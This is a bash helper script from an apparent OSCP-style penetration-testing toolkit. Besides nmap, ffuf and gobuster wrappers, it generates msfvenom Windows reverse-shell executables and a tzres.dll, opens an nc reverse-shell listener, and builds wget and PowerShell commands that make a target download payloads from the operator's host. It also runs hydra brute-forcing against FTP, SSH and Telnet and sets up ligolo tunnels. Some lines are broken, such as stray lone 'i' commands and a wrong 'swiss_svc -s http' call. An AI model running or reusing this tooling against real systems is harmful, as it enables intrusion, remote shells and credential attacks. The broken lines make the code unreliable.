#!/bin/bash


source $HOME/oscp-swiss/script/utils.sh
source $HOME/oscp-swiss/script/alias.sh
source $HOME/oscp-swiss/script/extension.sh

load_settings
load_private_scripts

# Description: List all functions, aliases, and variables
# Usage: swiss
function swiss() {
    local swiss_path="$HOME/oscp-swiss/script/oscp-swiss.sh"
    local alias_path="$HOME/oscp-swiss/script/alias.sh"
    local extension_path="$HOME/oscp-swiss/script/extension.sh"

    logger info "[i] Functions:"
    grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$swiss_path" | sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/' | sort | column
    grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$extension_path" | sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/' | sort | column

    logger info "\n[i] Aliases:"
    grep -E '^\s*alias\s+' "$extension_path" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column

    logger info "\n[i] Variables:"
    grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$extension_path" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
    grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$alias_path" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column

    # /private
    local script_dir="$HOME/oscp-swiss/private"
    if [ -d "$script_dir" ]; then
        for script in "$script_dir"/*.sh; do
        if [ -f "$script" ]; then
            logger warn "\n[i] Function under $script:"
            grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$script"| sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/' | sort | column
            logger warn "[i] Aliases under $script:"
            grep -E '^\s*alias\s+' "$script" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
            logger warn "[i] Variables under $script:"
            grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$script" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
        fi
        done
    else
        echo "Directory $script_dir not found."
    fi
}

# Description: warpped nmap command with default options
# TODO: update the default options, remove --i needs.
function nmap_default() {
    local mode="fast"
    local ip=""

    _help() {
        logger info "Usage: nmap_default --ip <IP> [--mode <mode>]"
        logger info "Modes: fast (default), tcp, udp, udp-all, stealth"
    }

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
        -i|--ip)
            shift
            ip="$1"
            ;;
        -m|--mode)
            shift
            mode="$1"
            ;;
        *)
            _help
            return 1
            ;;
        esac
        shift
    done

    if [[ -z "$ip" ]]; then
        _help
        return 1
    fi

    local saved_file_path="$(pwd)/nmap/$ip"
    logger info "[i] Creating directory $saved_file_path ..."
    mkdir -p $saved_file_path

    case "$mode" in
        fast)
            mkdir -p $saved_file_path/fast
            logger info "[i] Start quick check. Saved to $saved_file_path/quick-tcp"
            nmap -v --top-ports 2000 $ip -oN $saved_file_path/fast/tcp

            local fast_ports=$(grep -oP '^\d+\/\w+' $saved_file_path/fast/tcp | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
            logger info "[i] Checking service on ports - $fast_ports. Saved to $saved_file_path/fast/tcp-svc"
            nmap -p$fast_ports -sVC $ip -oN $saved_file_path/fast/tcp-svc

            logger info "[i] Checking vuln script - $fast_ports. Saved to $saved_file_path/fast/tcp-vuln"
            nmap -p$fast_ports --script vuln $ip -oN $saved_file_path/fast/tcp-vuln

            logger info "[i] Check UDP top 200 ports. Saved to $saved_file_path/fast/udp-top-200"
            sudo nmap --top-ports 200 -sU -F -v $ip -oN $saved_file_path/fast/udp-top-200
            ;;
        tcp)
            mkdir -p $saved_file_path/tcp
            logger info "[i] Start tcp check. Saved to $saved_file_path/tcp/check-1"
            nmap -p0-65535 -v $ip -oN $saved_file_path/tcp/check-1

            local ports=$(grep -oP '^\d+\/\w+' $saved_file_path/tcp/check-1 | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
            logger info "[i] Checking service on ports - $ports. Saved to $saved_file_path/tcp/svc"
            nmap -p$ports -sVC $ip -oN $saved_file_path/tcp/svc

            logger info "[i] Checking vuln script - $ports. Saved to $saved_file_path/tcp/vuln"
            nmap -p$ports --script vuln $ip -oN $saved_file_path/tcp/vuln
            
            logger info "[i] Start general check (second round). Saved to $saved_file_path/tcp/check-2"
            nmap -p0-65535 $ip -oN $saved_file_path/tcp/check-2
            
            local services_first=$(grep -oP '^\d+\/\w+' $saved_file_path/tcp/check-1 | awk '{print $1}' | sort -u)
        
            # Extract services from the second round
            local services_second=$(grep -oP '^\d+\/\w+' $saved_file_path/tcp/check-2 | awk '{print $1}' | sort -u)
            
            logger warn "[i] Services found in the second round but not in the first round:"
            comm -13 <(echo "$services_first") <(echo "$services_second")
            ;;
        udp)
            mkdir -p $saved_file_path/udp
            logger info "[i] Start udp check (top 200 ports). Saved to $saved_file_path/udp/udp_fast"
            sudo nmap --top-ports 200 -sU -F -v $ip -oN $saved_file_path/udp/fast
            ;;
        udp-all)
            mkdir -p $saved_file_path/udp
            logger info "[i] Start udp check (all). Saved to $saved_file_path/udp/udp_all"
            sudo nmap -sU -F -v $ip -oN $saved_file_path/udp/udp_all
            ;;
        stealth)
            mkdir -p $saved_file_path/stealth
            logger info "[i] Start stealth nmap. Saved to $saved_file_path/stealth/stealth"
            sudo nmap -sS -p0-65535 -oN $saved_file_path/stealth/stealth
            ;;
        *)
            echo "Error: Invalid mode '$mode'. Valid modes are: fast, tcp, udp, udp-all."
            return 1
            ;;
    esac
}

# Description: one-liner to start services, including docker, ftp, http, smb, ssh, bloodhound, ligolo (extension), wsgi
# Usage: swiss_svc <service name>
# Arguments:
#   service name: docker; ftp; http; smb; ssh; bloodhound; ligolo (extension); wsgi
# Example:
#   swiss_svc http # to spawn a http server in the current directory
#   swiss_svc ftp  # to spawn a ftp server in the current directory
function swiss_svc() {
    local service=""

    _help() {
        logger info "Usage: swiss_svc <service name>]"
        logger info "service: docker; ftp; http; smb; ssh; bloodhound; ligolo; wsgi"
    }

    service="$1"

    if [[ -z "$service" ]]; then
        _help
        return 1
    fi

    case "$service" in
        docker)
            logger info "[i] start docker"
            logger warn "[i] to stop, use the following commands: "
            logger warn "[i] sudo systemctl stop docker"
            logger warn "[i] sudo systemctl stop docker.socket"
            sudo service docker restart
            ;;
        ftp)
            logger info "[i] start ftp server on host"
            logger info "[i] usage:"
            logger info "[i] (1) run ftp"
            i
            logger info "[i] (2) run open <ip> 2121"
            logger info "[i] (2-2) Default Interface ($DEFAULT_NETWORK_INTERFACE) IP: $(get_default_network_interface_ip)"
            logger info "[i] (3) use username anonymous"
            logger info "[i] (4) binary # use binary mode"
            logger info "[i] (5) put <file-you-want-to-download>"
            python -m pyftpdlib -w
            ;;
        http)
            logger info "[i] start http server"
            logger warn "[i] python3 -m http.server 80"
            i
            python3 -m http.server 80
            ;;
        smb)
            logger info "[i] start smb server"
            logger info "[i] impacket-smbserver smb . -smb2support"
            i
            impacket-smbserver smb . -smb2support
            ;;
        ssh)
            logger info "[i] start ssh server"
            logger warn "[i] sudo systemctl stop ssh; kill -9 $(pgrep ssh); sudo systemctl start ssh"
            i
            # kill all ssh process
            sudo systemctl stop ssh
            kill -9 $(pgrep ssh)
            sudo systemctl start ssh
            ;;
        bloodhound)
            # ref: https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose
            logger info "[i] start BloodHound CE (v2.4.1) ..."
            logger info "[i] start port check on 8080"

            # Check if port 8080 is open using lsof
            if lsof -i :8080 > /dev/null; then
                logger error "Port 8080 is open. Exited"
                exit 1
            fi

            logger info "[i] cloning docker-compose files from /opt/BloodHound/examples/docker-compose"
            cp /opt/BloodHound/examples/docker-compose/* $(pwd)

            logger info "[i] BloodHound CE starts on port 8080 (default), username: admin, password check on the terminal logs"
            logger info "[i] preferred password: @Bloodhound123"

            sudo docker-compose up
            ;;
        ligolo)
            extension_fn_banner
            logger info "[i] start ligolo agent"
            logger warn "[i] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
            logger info "[i] under target (find agent executable under \$ligolo_path):"
            logger info "[i] agent.exe -connect $(get_default_network_interface_ip):443 -ignore-cert"
            logger warn "[i] Using fingerprint: "
            logger warn "[i] agent.exe -connect $(get_default_network_interface_ip):443 -accept-fingerprint [selfcert-value]"

            logger info "[i] after connection: "
            logger info "[i] > session                                    # choose the session"
            logger info "[i] > ifconfig                                   # check interface"
            logger info "[i] sudo ip route add 192.168.0.0/24 dev ligolo  # add interface"
            logger warn "[i] ip route del 122.252.228.38/32               # removal after use"
            logger info "[i] start                                        # start the agent"

            local ligolo_agent_path="$HOME/oscp-swiss/utils/tunnel/ligolo-0.6.2/proxy"
            $ligolo_agent_path -selfcert -laddr 0.0.0.0:443
            ;;
        wsgi)
            logger info "[i] start wsgidav under the directory: $(pwd)"
            logger info "[i] usage: svc_wsgi <port>"
            i
            $HOME/.local/bin/wsgidav --host=0.0.0.0 --port=${@} --auth=anonymous --root .
            ;;
        *)
            logger error "Error: Invalid service '$service'. Valid service: docker; ftp; http; smb; ssh; bloodhound; wsgi"
            return 1
            ;;
    esac
}

# Description: one-liner to ship files to the target machine. With no copy-paste needs.
# Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>
# Arguments:
#   -t|--type: linux|windows (default: linux)
#   -a|--auto-host-http: auto-host the http server (default: true)
# Example:
#   ship ./rce.sh
#   ship -t windows ./rce.exe
function ship() {
    local type="linux"
    local filepath
    local autoHostHttp=true

    _helper() {
        logger error "[e] Filepath is required."
        logger info "[i] Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>"
        return 1
    }

    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--type)
                type="$2"
                shift 2
                ;;
            -a|--auto-host-http)
                autoHostHttp="$2"
                shift 2
                ;;
            *)
                filepath="$1"
                shift
                ;;
        esac
    done

    if [[ -z "$filepath" ]]; then
        _helper
    fi

    if [[ ! -f "$filepath" ]]; then
        logger error "[e] File '$filepath' does not exist."
        return 1
    fi

    local filename=$(basename "$filepath")

    cp "$filepath" "./$filename" && logger info "[i] File '$filename' copied to current directory."


    autoHost() {
        if [[ "$autoHostHttp" = true ]]; then
            swiss_svc -s http
        else
            echo warning "[W] Remember to host the web server on your own"
        fi
    }

    if [[ "$type" == "linux" ]]; then
        local cmd="wget $(get_default_network_interface_ip)/$filename"
        logger info "[i] Linux type selected. wget command ready."
        logger info "[i] $cmd"
        echo -n $cmd | xclip -selection clipboard

        autoHost

    elif [[ "$type" == "windows" ]]; then
        local cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(get_default_network_interface_ip)/$filename' -OutFile \$env:TEMP\\$filename\""
        logger info "[i] Windows type selected. wget command ready."
        logger info "[i] $cmd"

        echo -n $cmd | xclip -selection clipboard

        autoHost
    else
        log error "Unknown type '$type'. Set to 'linux'."
    fi
}

# Description:
#   One-liner to start a reverse shell listener,
#   warpped with rlwrap to make the reverse shell interactive
# Usage: listen <port>
function listen() {
    rlwrap nc -lvnp $1
}

# Description: Generate a reverse shell using msfvenom
# Usage: swiss_windows_rev <-p PORT> <-a x86|x64|dll> [-i IP]
# Arguments:
#   -p|--port: Port number for the reverse shell
#   -a|--arch: Architecture for the reverse shell (x86, x64, dll)
#   -i|--ip: IP address for the reverse shell
# Example:
#  swiss_windows_rev -p 4444 -a x86 -i
function swiss_windows_rev() {
    logger info "[i] generating windows rev exe using msfvenom"

    local ip=$(get_default_network_interface_ip)
    local port=""
    local arch=""

    while [[ $# -gt 0 ]]; do
        case $1 in
            -i|--ip)
                ip="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -a|--arch)
                arch="$2"
                shift 2
                ;;
            *)
                logger error "[i] Invalid option: $1"
                logger info "[i] usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
                return 1
                ;;
        esac
    done

    if [[ -z "$port" || -z "$arch" ]]; then
        logger error "[i] Port and architecture must be specified"
        logger info "[i] usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
        return 1
    fi

    case $arch in
        x86)
            msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86.exe
            ;;
        x64)
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64.exe
            ;;
        dll)
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o tzres.dll
            ;;
        *)
            logger error "[i] Invalid architecture: $arch. Only x86, x64, and dll are supported."
            return 1
            ;;
    esac
}

# Description: default directory fuzzing using fuff, compatible with original arguments
# Usage: ffuf_default [URL/FUZZ] (options)
# Example: ffuf_default http://example.com/FUZZ -fc 400
function ffuf_default() {

    _helper() {
        logger info "[i] Usage: ffuf_default [URL/FUZZ] (options)"
        logger warn "[i] Recursive with depth = $FFUF_RECURSIVE_DEPTH"
        logger warn "[i] Default wordlist: $FFUF_DEFAULT_WORDLIST"
    }

    if [ $# -eq 0 ]; then
        _helper
    else
        local url="$1"
        if [[ "$url" =~ ^https?:// ]]; then
            # If the URL includes a protocol, extract the part after '://'
            local domain=$(echo "$url" | awk -F/ '{print $3}')
        else
            # If the URL does not include a protocol, treat the first part as the domain/IP
            local domain=$(echo "$url" | awk -F/ '{print $1}')
        fi
        local domain_dir="$(pwd)/ffuf/$domain"
        logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"
        ffuf -w $FFUF_DEFAULT_WORDLIST -recursion -recursion-depth $FFUF_RECURSIVE_DEPTH -u ${@} | tee "$domain_dir/ffuf-default"
    fi
}

# TODO: Finish doc
function ffuf_traversal_default() {
    _helper() {
        logger info "[i] Usage: ffuf_traversal_default [URL] (options)"
    }

    if [ $# -eq 0 ]; then
        _helper
    else
        local url="$1"
        if [[ "$url" =~ ^https?:// ]]; then
            local domain=$(echo "$url" | awk -F/ '{print $3}')
        else
            local domain=$(echo "$url" | awk -F/ '{print $1}')
        fi
        local domain_dir="$(pwd)/ffuf/$domain"
        logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"

        if [[ -f "$FFUF_TRAVERSAL_DEFAULT_WORDLIST.statistic" ]]; then
            _cat $FFUF_TRAVERSAL_DEFAULT_WORDLIST.statistic
        fi

        ffuf -w $FFUF_TRAVERSAL_DEFAULT_WORDLIST -u ${@} | tee "$domain_dir/traversal-default"
    fi
}

# TODO: Finish doc
# TODO: change save_path
function gobuster_subdomain_default() {
    if [ $# -eq 0 ]
    then
        logger info "[i] Usage: gobuster_subdomain_default [domain_name] (options)"
    else
        [ ! -d "$(pwd)/subdomain" ] && logger info "[i] Creating directory $(pwd)/subdomain ..." && mkdir -p subdomain
        logger info "[i] using wordlist: $GOBUSTER_SUBDOMAIN_VHOST_DEFAULT_WORDLIST"

        if [[ -f "$GOBUSTER_SUBDOMAIN_VHOST_DEFAULT_WORDLIST.statistic" ]]; then
            _cat $GOBUSTER_SUBDOMAIN_VHOST_DEFAULT_WORDLIST.statistic
        fi

        gobuster dns -w $GOBUSTER_SUBDOMAIN_VHOST_DEFAULT_WORDLIST -t 20 -o subdomain/subdomain-default -d ${@}
    fi
}

# TODO: Finish doc
function gobuster_vhost_default() {
    if [ $# -eq 0 ]
    then
        logger info "[i] Usage: gobuster_vhost_default [ip] [domain] (options)"
    else
        [ ! -d "$(pwd)/gobuster" ] && logger info "[i] Creating directory $(pwd)/gobuster ..." && mkdir -p gobuster
        logger info "[i] using wordlist: /amass/subdomains-top1mil-110000.txt"

        local ip="$1"
        local domain="$2"

        gobuster vhost -k -u $ip --domain $domain --append-domain -r -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -o gobuster/vhost_default -t 64
    fi
}

# Description: hydra default
function hydra_default() {
    local IP=$1
    local PORTS=$2

    if [ ! -f "username.txt" ]; then
        logger error "[E] username.txt not found in the current directory."
        return 1
    fi

    for PORT in $(echo $PORTS | tr "," "\n"); do
        case $PORT in
            21)
                logger info "[I] Running hydra for FTP on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT ftp://$IP
                ;;
            22)
                logger info "[I] Running hydra for SSH on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT ssh://$IP
                ;;
            23)
                logger info "[I] Running hydra for Telnet on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT telnet://$IP
                ;;
            *)
                echo "Port $PORT not recognized or not supported for brute-forcing by this script."
                ;;
        esac
    done
}

# copy the current directory name to the clipboard
# TODO: Finish doc
function cp_dir() {
    
    local current_dir=$(basename "$PWD")
    local dash_count=$(echo "$input" | tr -cd '-' | wc -c)

    # Check if the number of dashes is greater than 2
    if [ "$dash_count" -gt 2 ]; then
            # Copy the current directory name to the clipboard
            echo -n "$current_dir" | xclip -selection clipboard
            logger info "[i] Custom Format Invalid. Format: <name>-<IP> or <IP>-<name>."
            logger info "[i] Directory name '$current_dir' copied to clipboard."
    else
        local val1=$(echo "$current_dir" | awk -F- '{print $1}')
        local val2=$(echo "$current_dir" | awk -F- '{print $2}')

        logger info "[i] identified custom format: $val1-$val2"

        local ip_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"

        if [[ $val1 =~ $ip_regex ]]; then
            echo -n "$val1" | xclip -selection clipboard
            logger info "[i] IP '$val1' copied to clipboard."
        elif [[ $val2 =~ $ip_regex ]]; then
            echo -n "$val2" | xclip -selection clipboard
            logger info "[i] IP '$val2' copied to clipboard."
        else
            # Copy the current directory name to the clipboard
            echo -n "$current_dir" | xclip -selection clipboard
            echo "Directory name '$current_dir' copied to clipboard."
        fi
    fi
}

# Description: get all urls from a web page
# Usage: get_pagelink <url>
function get_pagelink() {
    logger info "[i] start extracting all urls from $1"
    logger info "[i] original files will be stored at $PWD/links.txt"
    logger info "[i] unique links (remove duplicated) will be stored at $PWD/links-uniq.txt"
    lynx -dump $1 | awk '/http/{print $2}' > links.txt
    sort -u links.txt > links-uniq.txt
    cat ./links-uniq.txt
}

# Description: get keywords from a web page
# Usage: gen_keywords <url>
function gen_keywords() {
    logger info "[i] Usage: gen_keywords <url>"
    cewl -d $CEWL_DEPTH -m $CEWL_MIN_WORD_LENGTH -w cewl-wordlist.txt $1
}

# Description: set the target IP address and set variable target
# Usage: set_target <ip>
function set_target() {
    s target $1
    target=$1
}

# Description: get the target IP address and copy it to the clipboard.
# Usage: get_target
function get_target() {
    target=$(g target)
    if [[ "$target" == "-1" ]]; then
        logger error "Target not found."
    elif [[ "$target" == "-2" ]]; then
        logger error "[!] Config file not found!"
    else
        echo -n "$target" | xclip -selection clipboard
        echo "Target '$target' copied to clipboard."
    fi
}

# Description:
#   Copy a linpeas-like script to the clickboard. You can paste it to the target machine (Linux) directly without any file transfer effort.
#   This is helpful to help you to enumerate the target machine.
#   Once you paste the script to the target machine, you can run the command `check` to enumerate:
# Usage (On the target machine): 
#   Usage: check <option>
# Arguments (option):
#   - 1|user|u: check user information
#   - 2|su: check sudo permission
#   - 3|suid: check suid permission
#   - 4|cred-file: check common credential files (i.e., /etc/passwd, /etc/group)
#   - 5|exec|executable: listing executable files
#   - 6|dir|directory: listing interesting directories (e.g., /tmp, /opt)
#   - 7|os: check OS information
#   - 8|ps|proc|process: check running processes
#   - 9|cron|crontab: check cron jobs
#   - 10|net|network: check network information
#   - 11|dir-filename: find interesting filename recursively under the current directory
#   - 12|dir-file: find the interesting file content recursively under the current directory
#   - 13|search-filename <keyword>: search filename with keyword under the current directory
#   - 14|search-file <keyword>: search file content with keyword under the current directory
#   - 15|env: check environment variables
# Example:
#   $ check user             # list user information
#   $ check 3                # list suid permission
#   $ check 14 funny-content # search file content with 'funny-content' under the current directory
function cp_target_script() {
    logger info "[i] Usage: cp_target_script"
    local shell_path="$HOME/oscp-swiss/script/target-enum-script.sh"
    local new_file_path="$mktemp.sh"
    _cat $shell_path > $new_file_path
    echo "" >> $new_file_path
    echo "host='$(get_default_network_interface_ip)'" >> $new_file_path
    echo "clear" >> $new_file_path
    _cat $new_file_path | xclip -selection clipboard
    rm $new_file_path
}

# Description: tcpdump traffic from an IP address
# Usage: listen_target <ip> [-i <interface> | --interface <interface>]
# Arguments:
#  <ip>: IP address to listen to
#  -i, --interface: Network interface to listen on (default: tun0)
# Example:
#   listen_target 192.168.1.2 # listen on traffic from/to 192.168.1.2 on the default network interface
function listen_target() {
    logger info "[i] tcpdump to listen on traffic from/to an IP address"
    logger info "[i] Usage: listen_target <ip> [-i <interface> | --interface <interface>]"

    local interface="${DEFAULT_NETWORK_INTERFACE:-tun0}"
    local ip=""

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i|--interface)
                interface="$2"
                shift 2
                ;;
            *)
                ip="$1"
                shift
                ;;
        esac
    done

    if [[ -z "$ip" ]]; then
        logger error "[!] IP address is required"
        return 1
    fi

    sudo tcpdump -i "$interface" dst "$ip" or src "$ip"
}

# Description:
#   Generate workspace for pen test. Including:
#       - Create a directory with the format <name>-<ip>
#       - Create username.txt and password.txt
#       - Set the current path as workspace, you can use go_workspace to jump to the workspace across sessions
#       - Set the target IP address, you can use get_target to copy the target IP address to the clipboard
#       - Copy the ip to the clipboard
# Usage: init_workspace
function init_workspace() {
    logger info "[i] Initializing workspace ..."
    logger info "[i] Enter workspace name: \c"
    read -r workspace_name
    logger info "[i] Enter IP address: \c"
    read -r ip_address

    local ip_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"
    if [[ ! $ip_address =~ $ip_regex ]]; then
        logger error "[!] Invalid IP address format."
        return 1
    fi

    local dir_name="${workspace_name}-${ip_address}"

    mkdir -p "$dir_name"
    cd "$dir_name" || { logger error "[!] Failed to enter directory '$dir_name'"; return 1; }

    touch username.txt
    touch password.txt

    set_workspace
    set_target "$ip_address"

    cp_dir
}

# Description: set the current path as workspace (cross-session)
# Usage: set_workspace
function set_workspace() {
    s workspace $PWD
}

# Description: go to the path defined as workspace (cross-session)
# Usage: go_workspace
function go_workspace() {
    cd $(g workspace)
}

# Description:
#   Spawn the new session in the workspace, and set target into the variables.
#   The  function is configured by the environment variable SPAWN_SESSION_IN_WORKSPACE
#   See settings.json for more details.
# Usage: spawn_session_in_workspace
function spawn_session_in_workspace() {
    if [ "$SPAWN_SESSION_IN_WORKSPACE" = true ]; then
        go_workspace
        target=$(g target)
    fi
}


# TODO: Doc
merge() {
    local output="merged.txt"
    local statistic=true
    local files=()
    local total_lines=0

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -o|--output)
                output="$2"
                shift 2
                ;;
            -s|--statistic)
                statistic="$2"
                shift 2
                ;;
            *)
                files+=("$1")
                shift
                ;;
        esac
    done

    if [[ "${#files[@]}" -lt 2 ]]; then
        logger error "At least two files to merge."
        return 1
    fi

    for file in "${files[@]}"; do
        if [[ ! -f "$file" ]]; then
            logger error "File not found: $file"
            return 1
        fi
    done

    local temp_output=$(mktemp)

    for file in "${files[@]}"; do
        total_lines=$((total_lines + $(wc -l < "$file")))
        sort -u "$file" >> "$temp_output"
    done

    sort -u "$temp_output" -o "$output"
    rm "$temp_output"

    local unique_lines
    unique_lines=$(wc -l < "$output")
    local duplicates_removed=$((total_lines - unique_lines))

    if [[ "$statistic" == true ]]; then
        local stat_file="$output.statistic"
        {
            echo "Original filenames:"
            for file in "${files[@]}"; do
                echo "  - $file"
            done
            echo "Line counts per file:"
            for file in "${files[@]}"; do
                echo "  - $file: $(wc -l < "$file") lines"
            done
            echo "Total line count before merge: $total_lines"
            echo "Total line count after merge: $unique_lines"
            echo "Lines saved after merge (duplicates removed): $duplicates_removed"
        } > "$stat_file"
    fi

    logger info "[i] Files merged into $output"
    [[ "$statistic" == true ]] && logger info "[i] Statistics saved to $stat_file"
}

# Description: retrieve all files from a ftp server
# Usage: get_ftp_all_files <ipaddress> [username] [password]
# Arguments:
#   - ipaddress: IP address of the FTP server
#   - username: FTP username (default: anonymous)
#   - password: FTP password (default: anonymous)
# Example: get_ftp_all_files 192.168.1.1
function get_ftp_all_files() {
    local IP=$1
    local USERNAME=${2:-"anonymous"}
    local PASSWORD=${3:-"anonymous"}

    _helper() {
        echo "Usage: get_ftp_all_files <ipaddress> [username] [password]"
        return 1
    }

    if [ -z "$IP" ]; then
        _helper
        return 1
    fi

    wget -r --no-passive --no-parent ftp://$USERNAME:$PASSWORD@$IP
}

# Description: lookup an IP address's public information
# Usage: target_ipinfo <ip>
function target_ipinfo() {
  curl https://ipinfo.io/$1/json
}

# Description: lookup the public IP address of the host
# Usage: host_public_ip
function host_public_ip() {
  curl ipinfo.io/ip
}

# TODO: Finish doc
function show_utils() {
    # Check if a directory is provided; if not, use the current directory
    local dir="${1:-$HOME/oscp-swiss/utils}"

    tree -C "$dir" -L 1 | while read -r line; do
        # Extract the file name from the tree output by ignoring color codes
        filename=$(echo "$line" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' | awk '{print $NF}')
        
        desc_file="${dir}/${filename}.md"
        
        if [[ -f "$desc_file" ]]; then
            desc=$(head -n 1 "$desc_file")
            echo -e "$line \033[33m$desc\033[0m"
        else
            echo "$line"
        fi
    done
}

# TODO: Finish doc
function explain() {
    if [[ -z "$1" ]]; then
        echo "Usage: explain <file_or_directory>"
        return 1
    fi

    local target="$1"
    
    local desc_file="${target}.md"
    
    if [[ -f "$desc_file" ]]; then
        cat "$desc_file"
    else
        echo "No description file found for $target."
    fi
}

spawn_session_in_workspace